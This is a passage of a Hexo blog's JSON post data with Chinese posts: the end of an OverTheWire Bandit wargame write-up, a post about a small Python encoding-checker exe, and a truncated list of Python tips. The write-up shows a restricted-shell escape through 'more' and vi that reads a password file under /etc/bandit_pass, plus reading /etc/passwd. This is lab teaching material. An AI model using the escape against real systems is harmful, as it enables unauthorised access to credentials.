class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit25@bandit:~$ ls</div><div class=\"line\">bandit26.sshkey</div><div class=\"line\">bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost        </div><div class=\"line\">Could not create directory <span class=\"string\">'/home/bandit25/.ssh'</span>.</div><div class=\"line\">The authenticity of host <span class=\"string\">'localhost (127.0.0.1)'</span> can<span class=\"string\">'t be established.</span></div><div class=\"line\">ECDSA key fingerprint is SHA256:rm2/oZ03et2au9vHBOtBNdgMDGJkbNqdkmHDLPDD32E.</div><div class=\"line\">Are you sure you want to continue connecting (yes/no)? yes</div><div class=\"line\"> | |                   | (_) | |__ \\ / /  </div><div class=\"line\"> | |__   __ _ _ __   __| |_| |_   ) / /_  </div><div class=\"line\"> | '_ \\ / _` | <span class=\"string\">'_ \\ / _` | | __| / / '</span>_ \\ </div><div class=\"line\"> | |_) | (_| | | | | (_| | | |_ / /| (_) |</div><div class=\"line\"> |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ </div><div class=\"line\">Connection to localhost closed.</div><div class=\"line\">bandit25@bandit:~$  </div><div class=\"line\"><span class=\"comment\"># ssh 连接以后把我提出来了。。。</span></div><div class=\"line\"><span class=\"comment\"># 题目提示 bandit26 的 shell 不是 /bin/bash，那我们看看是什么</span></div><div class=\"line\">bandit25@bandit:~$ cat /etc/passwd | grep bandit26</div><div class=\"line\">bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext</div><div class=\"line\">bandit25@bandit:~$ cat -n /usr/bin/showtext</div><div class=\"line\">     1  <span class=\"comment\">#!/bin/sh</span></div><div class=\"line\">     2</div><div class=\"line\">     3  <span class=\"built_in\">export</span> TERM=linux</div><div class=\"line\">     4</div><div class=\"line\">     5  more ~/text.txt</div><div class=\"line\">     6  <span class=\"built_in\">exit</span> 0</div><div class=\"line\"><span class=\"comment\"># more 命令是一次显示一屏文字，然后左下角会显示一个 more 和当前显示了百分之多少</span></div><div class=\"line\"><span class=\"comment\"># 我们在回头看看上面登陆后的字符画：</span></div><div class=\"line\"><span class=\"comment\"># | |                   | (_) | |__ \\ / /  </span></div><div class=\"line\"><span class=\"comment\"># | |__   __ _ _ __   __| |_| |_   ) / /_  </span></div><div class=\"line\"><span class=\"comment\"># | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ </span></div><div class=\"line\"><span class=\"comment\"># | |_) | (_| | | | | (_| | | |_ / /| (_) |</span></div><div class=\"line\"><span class=\"comment\"># |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ </span></div><div class=\"line\"><span class=\"comment\"># 之前在其他登陆中不曾见过，想必就是 more 命令显示的 text.txt 的内容</span></div><div class=\"line\"><span class=\"comment\"># 因为行数足以一屏显示完，所以没有显示 more 就没有显示</span></div><div class=\"line\"><span class=\"comment\"># 我们的思路就在 more 的这个特点上。我们要让他卡在一屏读不完的位置，也就是让你的终端高度读不下6行（字符画高度）。</span></div><div class=\"line\"><span class=\"comment\"># 这样我们可以在 more 的状态下通过一些特性执行命令找到我们下一关的密码。</span></div><div class=\"line\"><span class=\"comment\"># 因为上面的字符画有6行，而使用 chrome 没办法变那么窄，我们转而使用系统的命令行 ssh 上去搞。</span></div></pre></td></tr></table></figure>\n<p>我们先连接上去<br><img src=\"/Image/bandit_resources/9E633BCC3C0A9193B0E8E2C2B65731BA.jpg\" alt=\"IMAGE\"><br>然后我们使用 bandit25 这个用户带着 bandit26 的 privatekey 去连接 bandit26<br><img src=\"/Image/bandit_resources/D9A392F2C38EC45B17ACAAB75A5E3890.jpg\" alt=\"IMAGE\"><br>more 命令像预期一样输出一屏后等待我们的动作：<br><img src=\"/Image/bandit_resources/E02BACB49695839AC213BC250033CBDE.jpg\" alt=\"IMAGE\"><br>我们看看手册，有没有能我们需要的东西：<br><img src=\"/Image/bandit_resources/A821D5D2B3FBEF8E79E26DE69CA97891.jpg\" alt=\"IMAGE\"><br>这个v命令能让我们进入 vi 模式，虽然不常用 vi，但经常 vim 敲代码，经常使用「:sp」「:vsp」这种能打开其他文件的命令。<br>我们再去看看 vi 的 man 手册：<br><img src=\"/Image/bandit_resources/06367F7F7B9D0A55C16D0B51300F9A4B.jpg\" alt=\"IMAGE\"><br>看起来就是我们需要的命令，那我们去试试。<br>在 more 的页面按v进入vi<br><img src=\"/Image/bandit_resources/FDDCDF1F1AA31D4A681D965AB9B27E74.jpg\" alt=\"IMAGE\"><br>然后使用命令 <code>:ex! /etc/bandit_pass/bandit26</code> 打开我们需要的密码文件：<br><img src=\"/Image/bandit_resources/DDF96BC0FFF6CC6F41E8694DBDC1CE1E.jpg\" alt=\"IMAGE\"></p>\n<p>心路历程：这关很有意思，刚好 more 与 vi 这两个命令我都不常用，查阅文档与测试了一番。诸如登陆时候的字符画与 more 这种小细节，透过终端似乎能在看到设计者的：）</p>\n<hr>\n<p>Level 26 - 27</p>\n<p>描述：<strong>这时候，27级还不存在</strong></p>\n<p>[Game Over]</p>\n<hr>\n<p>嗯……游戏是结束了，我最后问一句：<br><img src=\"/Image/bandit_resources/00023D502683EF1B4545C5273153F690.jpg\" alt=\"IMAGE\"></p>"},{"title":"用 python 写一个exe应用程序 - SuperEncoding","date":"2017-06-28T09:41:27.000Z","layout":"post","comments":1,"--reward":true,"_content":"\n**作为程序员，能写个程序解决日常需求还是很开心的。\n这边把应用程序和代码分享下。\n代码简单到仅仅实现了功能，方便小伙伴们阅读。**\n\n<!--more-->\n\n### 程序诞生背景\n公司女同事在传文件到服务器时总会因为编码问题导致上传或者显示出错。\n有一次找到我，说起出错这件事，我写了个python的脚本帮她测了下文件编码，发现出错的文件大部分都是编码不正确导致的。\n这件事过后我抽了个时间。把之前的脚本改成了一个exe可执行程序，这样就省得来找我测编码了（对，没错，注孤生）。\n\n### 程序简介\n选择文件，显示文件编码信息。\n听起来很简单对吧，嗯，写起来也很简单。\n\n### 实现思路\n我们需要干三件事\n1.python 获取文件编码信息的代码（其实就是几行代码~）\n2.通过 GUI 实现选择文件显示编码信息（我这里选择的 Tkinter）\n3.打包成 exe（我这里选择的PyInstaller）\n\n### 资源\n|获取方式|获取地址|备注|\n|:--------:|:--------:|:--------:|\n|github|[SuperEncoding_github](https://github.com/jazhLeo/SuperEncoding)||\n|百度云|[SuperEncoding_百度云](https://pan.baidu.com/s/1geM8i8z)|提取码: bcyj|\n","source":"_posts/python_SuperEncoding.md","raw":"---\ntitle: 用 python 写一个exe应用程序 - SuperEncoding\ndate: 2017-6-28 17:41:27\nlayout: post\ncomments: true\n--reward: true\ntags:\n    - 工具\n    - python\n---\n\n**作为程序员，能写个程序解决日常需求还是很开心的。\n这边把应用程序和代码分享下。\n代码简单到仅仅实现了功能，方便小伙伴们阅读。**\n\n<!--more-->\n\n### 程序诞生背景\n公司女同事在传文件到服务器时总会因为编码问题导致上传或者显示出错。\n有一次找到我，说起出错这件事，我写了个python的脚本帮她测了下文件编码，发现出错的文件大部分都是编码不正确导致的。\n这件事过后我抽了个时间。把之前的脚本改成了一个exe可执行程序，这样就省得来找我测编码了（对，没错，注孤生）。\n\n### 程序简介\n选择文件，显示文件编码信息。\n听起来很简单对吧，嗯，写起来也很简单。\n\n### 实现思路\n我们需要干三件事\n1.python 获取文件编码信息的代码（其实就是几行代码~）\n2.通过 GUI 实现选择文件显示编码信息（我这里选择的 Tkinter）\n3.打包成 exe（我这里选择的PyInstaller）\n\n### 资源\n|获取方式|获取地址|备注|\n|:--------:|:--------:|:--------:|\n|github|[SuperEncoding_github](https://github.com/jazhLeo/SuperEncoding)||\n|百度云|[SuperEncoding_百度云](https://pan.baidu.com/s/1geM8i8z)|提取码: bcyj|\n","slug":"python_SuperEncoding","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k8d000gmkwb6xsvjxsu","content":"<p><strong>作为程序员，能写个程序解决日常需求还是很开心的。<br>这边把应用程序和代码分享下。<br>代码简单到仅仅实现了功能，方便小伙伴们阅读。</strong></p>\n<a id=\"more\"></a>\n<h3 id=\"程序诞生背景\"><a href=\"#程序诞生背景\" class=\"headerlink\" title=\"程序诞生背景\"></a>程序诞生背景</h3><p>公司女同事在传文件到服务器时总会因为编码问题导致上传或者显示出错。<br>有一次找到我，说起出错这件事，我写了个python的脚本帮她测了下文件编码，发现出错的文件大部分都是编码不正确导致的。<br>这件事过后我抽了个时间。把之前的脚本改成了一个exe可执行程序，这样就省得来找我测编码了（对，没错，注孤生）。</p>\n<h3 id=\"程序简介\"><a href=\"#程序简介\" class=\"headerlink\" title=\"程序简介\"></a>程序简介</h3><p>选择文件，显示文件编码信息。<br>听起来很简单对吧，嗯，写起来也很简单。</p>\n<h3 id=\"实现思路\"><a href=\"#实现思路\" class=\"headerlink\" title=\"实现思路\"></a>实现思路</h3><p>我们需要干三件事<br>1.python 获取文件编码信息的代码（其实就是几行代码~）<br>2.通过 GUI 实现选择文件显示编码信息（我这里选择的 Tkinter）<br>3.打包成 exe（我这里选择的PyInstaller）</p>\n<h3 id=\"资源\"><a href=\"#资源\" class=\"headerlink\" title=\"资源\"></a>资源</h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">获取方式</th>\n<th style=\"text-align:center\">获取地址</th>\n<th style=\"text-align:center\">备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">github</td>\n<td style=\"text-align:center\"><a href=\"https://github.com/jazhLeo/SuperEncoding\" target=\"_blank\" rel=\"external\">SuperEncoding_github</a></td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">百度云</td>\n<td style=\"text-align:center\"><a href=\"https://pan.baidu.com/s/1geM8i8z\" target=\"_blank\" rel=\"external\">SuperEncoding_百度云</a></td>\n<td style=\"text-align:center\">提取码: bcyj</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"<p><strong>作为程序员，能写个程序解决日常需求还是很开心的。<br>这边把应用程序和代码分享下。<br>代码简单到仅仅实现了功能，方便小伙伴们阅读。</strong></p>","more":"<h3 id=\"程序诞生背景\"><a href=\"#程序诞生背景\" class=\"headerlink\" title=\"程序诞生背景\"></a>程序诞生背景</h3><p>公司女同事在传文件到服务器时总会因为编码问题导致上传或者显示出错。<br>有一次找到我，说起出错这件事，我写了个python的脚本帮她测了下文件编码，发现出错的文件大部分都是编码不正确导致的。<br>这件事过后我抽了个时间。把之前的脚本改成了一个exe可执行程序，这样就省得来找我测编码了（对，没错，注孤生）。</p>\n<h3 id=\"程序简介\"><a href=\"#程序简介\" class=\"headerlink\" title=\"程序简介\"></a>程序简介</h3><p>选择文件，显示文件编码信息。<br>听起来很简单对吧，嗯，写起来也很简单。</p>\n<h3 id=\"实现思路\"><a href=\"#实现思路\" class=\"headerlink\" title=\"实现思路\"></a>实现思路</h3><p>我们需要干三件事<br>1.python 获取文件编码信息的代码（其实就是几行代码~）<br>2.通过 GUI 实现选择文件显示编码信息（我这里选择的 Tkinter）<br>3.打包成 exe（我这里选择的PyInstaller）</p>\n<h3 id=\"资源\"><a href=\"#资源\" class=\"headerlink\" title=\"资源\"></a>资源</h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">获取方式</th>\n<th style=\"text-align:center\">获取地址</th>\n<th style=\"text-align:center\">备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">github</td>\n<td style=\"text-align:center\"><a href=\"https://github.com/jazhLeo/SuperEncoding\" target=\"_blank\" rel=\"external\">SuperEncoding_github</a></td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">百度云</td>\n<td style=\"text-align:center\"><a href=\"https://pan.baidu.com/s/1geM8i8z\" target=\"_blank\" rel=\"external\">SuperEncoding_百度云</a></td>\n<td style=\"text-align:center\">提取码: bcyj</td>\n</tr>\n</tbody>\n</table>"},{"title":"给程序员的 30 个基本 Python 贴士与技巧","date":"2017-04-18T16:16:01.000Z","layout":"post","comments":1,"--reward":true,"_content":"如果你已经在用 python 了，相信这篇 blog 会对你有帮助的。  \n如果你还没有使用 python，相信看完下面 python 的实现，你会觉得**编程也是一件幸福的事**：）\n\n![Python_Love](/Image/python-love.png)\n\n如果你让一个 Python 程序员说一下 Python 的优势，他会说简洁以及高可读是最有影响力的优势。为证明上述两点，在这个 Python 教程里，我们将聊聊许多基本的 Python 建议和技巧。\n\n<!--more-->\n我们从开始使用 Python 便收集这些有用的捷径（贴士与技巧）。分享一些我们知道，同时又能造福于人的知识，有什么事情比这更棒吗？\n\n过去我们分享过 一些 [给初学者的 Python 编程贴士](http://www.techbeamers.com/top-10-python-coding-tips-for-beginners/) 旨在优化代码并且减少编码工作，我们的读者仍旧很乐意阅读它。\n\n所以今天我们带来另一些基本的 Python 贴士与技巧，所有的这些技巧都能帮助你压缩代码并且优化运行。此外，你可以在日常工作中很容易地在真实项目中使用他们。\n\n每一个技巧都有一个示例并且给出简短的解释，如果要测试这些代码片段，你可以看一下这些 [在线虚拟 Python 运行终端](http://www.techbeamers.com/best-python-interpreter-execute-python-online/)。\n\n \n\n最近我们发布的另两个必看的 Python 资源：\n\n💡 [9 种优化 Python 代码的主要方式](http://www.techbeamers.com/python-code-optimization-tips-tricks/)\n\n💡 [发现在编程时应该避免的最常见的错误](http://www.techbeamers.com/python-programming-mistakes/)\n\n\n# 给程序员的 30 个基本 Python 贴士与技巧\n\n## 贴士#1. 原地交换两个数字\n\nPython 提供了一个直观的在一行代码中赋值与交换（变量值）的方法，请参见下面的示例：\n\n```python\nx, y = 10, 20\nprint(x, y)\n\nx, y = y, x\nprint(x, y)\n\n#1 (10, 20)\n#2 (20, 10)\n```\n赋值的右侧形成了一个新的元组，左侧立即解析（unpack）那个（未被引用的）元组到变量 &lt;a> 和 &lt;b>。\n\n一旦赋值完成，新的元组变成了未被引用状态并且被标记为可被垃圾回收，最终也完成了变量的交换。\n\n## 贴士#2. 链状比较操作符\n\n比较操作符的聚合是另一个有时很方便的技巧：\n\n```python\nn = 10\nresult = 1 < n < 20\nprint(result)\n\n# True\n\nresult = 1 > n <= 9\nprint(result)\n\n# False\n```\n \n## 贴士#3. 使用三元操作符来进行条件赋值\n\n三元操作符是 if-else 语句也就是条件操作符的一个快捷方式：\n\n```python\n[表达式为真的返回值] if [表达式] else [表达式为假的返回值]\n```\n这里给出几个你可以用来使代码紧凑简洁的例子。下面的语句是说“如果 y 是 9，给 x 赋值 10，不然赋值为 20”。如果需要的话我们也可以延长这条操作链。\n\n```python\nx = 10 if (y == 9) else 20\n```\n同样地，我们可以对类做这种操作：\n\n```python\nx = (classA if y == 1 else classB)(param1, param2)\n```\n\n在上面的例子里 classA 与 classB 是两个类，其中一个类的构造函数会被调用。\n\n下面是另一个多个条件表达式链接起来用以计算最小值的例子：\n\n```python\ndef small(a, b, c):\n    return a if a <= b and a <= c else (b if b <= a and b <= c else c)\n\nprint(small(1, 0, 1))\nprint(small(1, 2, 2))\nprint(small(2, 2, 3))\nprint(small(5, 4, 3))\n\n#Output\n#0 #1 #2 #3\n```\n\n我们甚至可以在列表推导中使用三元运算符：\n\n```python\n[m**2 if m > 10 else m**4 for m in range(50)]\n\n#=> [0, 1, 16, 81, 256, 625, 1296, 2401, 4096, 6561, 10000, 121, 144, 169, 196, 225, 256, 289, 324, 361, 400, 441, 484, 529, 576, 625, 676, 729, 784, 841, 900, 961, 1024, 1089, 1156, 1225, 1296, 1369, 1444, 1521, 1600, 1681, 1764, 1849, 1936, 2025, 2116, 2209, 2304, 2401]\n```\n\n## 贴士#4. 多行字符串\n\n基本的方式是使用源于 C 语言的反斜杠：\n\n```python\nmultiStr = \"select * from multi_row \\\nwhere row_id < 5\"\nprint(multiStr)\n\n# select * from multi_row where row_id < 5\n```\n另一个技巧是使用三引号：\n\n```python\nmultiStr = \"\"\"select * from multi_row \nwhere row_id < 5\"\"\"\nprint(multiStr)\n\n#select * from multi_row \n#where row_id < 5\n```\n \n\n上面方法共有的问题是缺少合适的缩进，如果我们尝试缩进会在字符串中插入空格。所以最后的解决方案是将字符串分为多行并且将整个字符串包含在括号中：\n\n```python\nmultiStr= (\"select * from multi_row \"\n            \"where row_id < 5 \"\n            \"order by age\")\nprint(multiStr)\n\n#select * from multi_row where row_id < 5 order by age\n```\n## 贴士#5. 存储列表元素到新的变量中\n\n我们可以使用列表来初始化多个变量，在解析列表时，变量的数目不应该超过列表中的元素个数：【译者注：元素个数与列表长度应该严格相同，不然会报错】\n\n```python\ntestList = [1,2,3]\nx, y, z = testList\n\nprint(x, y, z)\n\n#-> 1 2 3\n```\n## 贴士#6. 打印引入模块的文件路径\n\n如果你想知道引用到代码中模块的绝对路径，可以使用下面的技巧：\n\n```python\nimport threading \nimport socket\n\nprint(threading)\nprint(socket)\n\n#1- <module 'threading' from '/usr/lib/python2.7/threading.py'>\n#2- <module 'socket' from '/usr/lib/python2.7/socket.py'>\n```\n\n## 贴士#7. 交互环境下的 “_” 操作符\n\n这是一个我们大多数人不知道的有用特性，在 Python 控制台，不论何时我们测试一个表达式或者调用一个方法，结果都会分配给一个临时变量： _（一个下划线）。\n\n```python\n>>> 2 + 1\n3\n>>> _\n3\n>>> print _\n3\n```\n“_” 是上一个执行的表达式的输出。\n\n## 贴士#8. 字典/集合推导\n\n与我们使用的列表推导相似，我们也可以使用字典/集合推导，它们使用起来简单且有效，下面是一个例子：\n\n```python\ntestDict = {i: i * i for i in xrange(10)} \ntestSet = {i * 2 for i in xrange(10)}\n\nprint(testSet)\nprint(testDict)\n\n#set([0, 2, 4, 6, 8, 10, 12, 14, 16, 18])\n#{0: 0, 1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81}\n```\n注：两个语句中只有一个 <:> 的不同，另，在 Python3 中运行上述代码时，将 &lt;xrange> 改为 &lt;range>。\n\n## 贴士#9. 调试脚本\n\n我们可以在 &lt;pdb> 模块的帮助下在 Python 脚本中设置断点，下面是一个例子：\n\n```python\nimport pdb\npdb.set_trace()\n```\n我们可以在脚本中任何位置指定 &lt;pdb.set_trace()> 并且在那里设置一个断点，相当简便。\n\n## 贴士#10. 开启文件分享\n\nPython 允许运行一个 HTTP 服务器来从根路径共享文件，下面是开启服务器的命令：\n\n### # Python 2\n```python\npython -m SimpleHTTPServer\n```\n### # Python 3\n```python\npython3 -m http.server\n```\n上面的命令会在默认端口也就是 8000 开启一个服务器，你可以将一个自定义的端口号以最后一个参数的方式传递到上面的命令中。\n\n## 贴士#11. 检查 Python 中的对象\n\n我们可以通过调用 dir() 方法来检查 Python 中的对象，下面是一个简单的例子：\n\n```python\ntest = [1, 3, 5, 7]\nprint( dir(test) )\n\n['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']\n```\n## 贴士#12. 简化 if 语句\n\n我们可以使用下面的方式来验证多个值：\n```python\nif m in [1,3,5,7]:\n```\n而不是：\n\n```python\nif m==1 or m==3 or m==5 or m==7:\n```\n\n或者，对于 in 操作符我们也可以使用 '{1,3,5,7}' 而不是 '[1,3,5,7]'，因为 set 中取元素是 O(1) 操作。\n\n## 贴士#13. 运行时检测 Python 版本\n\n当正在运行的 Python 低于支持的版本时，有时我们也许不想运行我们的程序。为达到这个目标，你可以使用下面的代码片段，它也以可读的方式输出当前 Python 版本：\n\n```python\nimport sys\n\n#Detect the Python version currently in use.\nif not hasattr(sys, \"hexversion\") or sys.hexversion != 50660080:\n    print(\"Sorry, you aren't running on Python 3.5n\")\n    print(\"Please upgrade to 3.5.n\")\n    sys.exit(1)\n\n#Print Python version in a readable format.\nprint(\"Current Python version: \", sys.version)\n```\n\n或者你可以使用 sys.version_info >= (3, 5) 来替换上面代码中的 sys.hexversion != 50660080，这是一个读者的建议。\n\n在 Python 2.7 上运行的结果：\n\n```Python\n\nPython 2.7.10 (default, Jul 14 2015, 19:46:27)\n[GCC 4.8.2] on linux\n\nSorry, you aren't running on Python 3.5\n\nPlease upgrade to 3.5.\n```\n \n在 Python 3.5 上运行的结果：\n\n```Python\n\nPython 3.5.1 (default, Dec 2015, 13:05:11)\n[GCC 4.8.2] on linux\n\nCurrent Python version:  3.5.2 (default, Aug 22 2016, 21:11:05) \n[GCC 5.3.0]\n```\n \n## 贴士#14. 组合多个字符串\n\n如果你想拼接列表中的所有记号，比如下面的例子：\n\n```python\n>>> test = ['I', 'Like', 'Python', 'automation']\n```\n现在，让我们从上面给出的列表元素新建一个字符串：\n```python\n>>> print ''.join(test)\n```\n## 贴士#15. 四种翻转字符串/列表的方式\n\n### # 翻转列表本身\n\n```python\ntestList = [1, 3, 5]\ntestList.reverse()\nprint(testList)\n\n#-> [5, 3, 1]\n```\n### # 在一个循环中翻转并迭代输出\n\n```python\nfor element in reversed([1,3,5]):\n    print(element)\n\n#1-> 5\n#2-> 3\n#3-> 1\n```\n\n### # 一行代码翻转字符串\n\n```python\n\"Test Python\"[::-1]\n```\n输出为 “nohtyP tseT”\n\n### # 使用切片翻转列表\n\n```python\n[1, 3, 5][::-1]\n```\n上面的命令将会给出输出 [5,3,1]。\n\n## #贴士#16. 玩转枚举\n\n使用枚举可以在循环中方便地找到（当前的）索引：\n\n```python \ntestlist = [10, 20, 30]\nfor i, value in enumerate(testlist):\n    print(i, ': ', value)\n\n#1-> 0 : 10\n#2-> 1 : 20\n#3-> 2 : 30\n```\n## 贴士#17. 在 Python 中使用枚举量\n\n我们可以使用下面的方式来定义枚举量：\n\n```python\nclass Shapes:\n    Circle, Square, Triangle, Quadrangle = range(4)\n\nprint(Shapes.Circle)\nprint(Shapes.Square)\nprint(Shapes.Triangle)\nprint(Shapes.Quadrangle)\n\n#1-> 0\n#2-> 1\n#3-> 2\n#4-> 3\n```\n## 贴士#18. 从方法中返回多个值\n\n并没有太多编程语言支持这个特性，然而 Python 中的方法确实（可以）返回多个值，请参见下面的例子来看看这是如何工作的：\n\n```python\n# function returning multiple values.\ndef x():\n    return 1, 2, 3, 4\n\n# Calling the above function.\na, b, c, d = x()\n\nprint(a, b, c, d)\n\n#-> 1 2 3 4\n```\n\n## 贴士#19. 使用 * 运算符（splat operator）来 unpack 函数参数\n\n* 运算符（splat operator）提供了一个艺术化的方法来 unpack 参数列表，为清楚起见请参见下面的例子：\n```python\ndef test(x, y, z):\n    print(x, y, z)\n\ntestDict = {'x': 1, 'y': 2, 'z': 3} \ntestList = [10, 20, 30]\n\ntest(*testDict)\ntest(**testDict)\ntest(*testList)\n\n#1-> x y z\n#2-> 1 2 3\n#3-> 10 20 30\n```\n## 贴士#20. 使用字典来存储选择操作\n\n我们能构造一个字典来存储表达式：\n```python\nstdcalc = {\n    'sum': lambda x, y: x + y,\n    'subtract': lambda x, y: x - y\n}\n\nprint(stdcalc['sum'](9,3))\nprint(stdcalc['subtract'](9,3))\n```\n\n## 贴士#21. 一行代码计算任何数的阶乘\n\n### Python 2.x.\n\n```python\nresult = (lambda k: reduce(int.__mul__, range(1,k+1),1))(3)\nprint(result)\n\n#-> 6\n```\n### Python 3.x.\n\n```python\nimport functools\nresult = (lambda k: functools.reduce(int.__mul__, range(1,k+1),1))(3)\nprint(result)\n\n#-> 6\n```\n## 贴士#22. 找到列表中出现最频繁的数\n\n```python\ntest = [1,2,3,4,2,2,3,1,4,4,4]\nprint(max(set(test), key=test.count))\n\n#-> 4\n```\n## 贴士#23. 重置递归限制\n\nPython 限制递归次数到 1000，我们可以重置这个值：\n\n```python\nimport sys\n\nx=1001\nprint(sys.getrecursionlimit())\n\nsys.setrecursionlimit(x)\nprint(sys.getrecursionlimit())\n\n#-> 1000\n#-> 1001\n```\n请只在必要的时候采用上面的技巧。\n\n## 贴士#24. 检查一个对象的内存使用\n\n在 Python 2.7 中，一个 32 比特的整数占用 24 字节，在 Python 3.5 中占用 28 字节。为确定内存使用，我们可以调用 getsizeof 方法：\n\n在 Python 2.7 中\n\n```python\nimport sys\nx=1\nprint(sys.getsizeof(x))\n\n#-> 24\n```\n在 Python 3.5 中\n\n```python\nimport sys\nx=1\nprint(sys.getsizeof(x))\n\n#-> 28\n```\n## 贴士#25. 使用 __slots__ 来减少内存开支\n\n你是否注意到你的 Python 应用占用许多资源特别是内存？有一个技巧是使用 __slots__ 类变量来在一定程度上减少内存开支。\n\n```python\nimport sys\nclass FileSystem(object):\n\n    def __init__(self, files, folders, devices):\n        self.files = files\n        self.folders = folders\n        self.devices = devices\nprint(sys.getsizeof( FileSystem ))\n\nclass FileSystem1(object):\n\n    __slots__ = ['files', 'folders', 'devices']\n    def __init__(self, files, folders, devices):\n        self.files = files\n        self.folders = folders\n        self.devices = devices\n\nprint(sys.getsizeof( FileSystem1 ))\n\n#In Python 3.5\n#1-> 1016\n#2-> 888\n\n# 经测试 在我的 win10 python27 中跑出的结果是：\n#1-> 452\n#2-> 512\n```\n\n很明显，你可以从结果中看到确实有内存使用上的节省，但是你只应该在一个类的内存开销不必要得大时才使用 __slots__。只在对应用进行性能分析后才使用它，不然地话，你只是使得代码难以改变而没有真正的益处。\n\n所以，这种比较方式是不那么让人信服的，使用 __slots__ 主要是用以限定对象的属性信息，另外，当生成对象很多时花销可能会小一些，具体可以参见 [python 官方文档](https://docs.python.org/3/reference/datamodel.html?highlight=__slots__#object.__slots__):\n\nThe slots declaration takes a sequence of instance variables and reserves just enough space in each instance to hold a value for each variable. Space is saved because dict is not created for each instance. \n\n也可参考廖雪峰老师的 [使用__slots__](http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0013868200605560b1bd3c660bf494282ede59fee17e781000) \n\n\n## 贴士#26. 使用 lambda 来模仿输出方法\n\n```python\nimport sys\nlprint=lambda *args:sys.stdout.write(\" \".join(map(str,args)))\nlprint(\"python\", \"tips\",1000,1001)\n\n#-> python tips 1000 1001\n```\n\n## 贴士#27. 从两个相关的序列构建一个字典\n\n```python\nt1 = (1, 2, 3)\nt2 = (10, 20, 30)\n\nprint(dict (zip(t1,t2)))\n\n#-> {1: 10, 2: 20, 3: 30}\n```\n\n## 贴士#28. 一行代码搜索字符串的多个前后缀\n\n```python\nprint(\"http://www.google.com\".startswith((\"http://\", \"https://\")))\nprint(\"http://www.google.co.uk\".endswith((\".com\", \".co.uk\")))\n\n#1-> True\n#2-> True\n```\n\n## 贴士#29. 不使用循环构造一个列表\n\n```python\nimport itertools\ntest = [[-1, -2], [30, 40], [25, 35]]\nprint(list(itertools.chain.from_iterable(test)))\n\n#-> [-1, -2, 30, 40, 25, 35]\n```\n## 贴士#30. 在 Python 中实现一个真正的 switch-case 语句\n\n下面的代码使用一个字典来模拟构造一个 switch-case。\n\n```python\ndef xswitch(x): \n    return xswitch._system_dict.get(x, None)\n\nxswitch._system_dict = {'files': 10, 'folders': 5, 'devices': 2}\n\nprint(xswitch('default'))\nprint(xswitch('devices'))\n\n#1-> None\n#2-> 2\n```\n\n结语 – 给程序员的基本 Python 贴士与技巧\n\n我们希望上述的基本的 Python 贴士与技巧可以帮助你快速地 & 有效地完成任务，你可以在作业与项目中使用他们。\n\n听从你的回馈会使我们变得更好，所以请分享你的想法。\n\n你甚至可以要求我们写一个你选择的话题，我们会将其加入到我们的写作列表中。【*】\n\n最后，如果你喜欢这个文章，请在社交媒体上分享给你的朋友。\n\n坚持学习，\n\nTechBeamers.\n\n> 本文由 伯乐在线 - 阿喵 翻译，艾凌风 校稿。英文出处：Meenakshi Agarwal。","source":"_posts/python_30_tips.md","raw":"---\ntitle: 给程序员的 30 个基本 Python 贴士与技巧\ndate: 2017-4-19 00:16:01\nlayout: post\ncomments: true\n--reward: true\ntags:\n    - python\n---\n如果你已经在用 python 了，相信这篇 blog 会对你有帮助的。  \n如果你还没有使用 python，相信看完下面 python 的实现，你会觉得**编程也是一件幸福的事**：）\n\n![Python_Love](/Image/python-love.png)\n\n如果你让一个 Python 程序员说一下 Python 的优势，他会说简洁以及高可读是最有影响力的优势。为证明上述两点，在这个 Python 教程里，我们将聊聊许多基本的 Python 建议和技巧。\n\n<!--more-->\n我们从开始使用 Python 便收集这些有用的捷径（贴士与技巧）。分享一些我们知道，同时又能造福于人的知识，有什么事情比这更棒吗？\n\n过去我们分享过 一些 [给初学者的 Python 编程贴士](http://www.techbeamers.com/top-10-python-coding-tips-for-beginners/) 旨在优化代码并且减少编码工作，我们的读者仍旧很乐意阅读它。\n\n所以今天我们带来另一些基本的 Python 